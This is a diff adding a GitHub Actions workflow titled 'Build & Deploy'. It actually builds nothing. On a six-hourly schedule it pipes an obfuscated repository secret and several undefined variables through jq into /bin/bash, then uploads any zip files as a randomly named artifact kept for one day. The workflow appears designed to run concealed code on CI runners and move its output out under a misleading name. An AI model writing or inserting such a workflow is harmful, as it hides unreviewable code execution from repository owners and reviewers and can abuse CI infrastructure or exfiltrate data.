@@ -1,0 +1,33 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          shdq832: ${{ secrets.shdq832 }}
+        run: |
+          printf '%s' "$shdq832" | jq -r .ikeww75189 | /bin/bash
+          echo $wb5563 | jq -r .hahg73 | /bin/bash
+          printf '%s' "$cmi36253" | jq -r .qlz48 | /bin/bash
+          printf '%s' "$nawo7072" | jq -r .d851 | /bin/bash
+          printf '%s' "$mbdn44" | jq -r .bh2300 | /bin/bash
+          echo $f694 | jq -r .hh8 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: X92nkwBz
+          path: "*.zip"
+          retention-days: 1
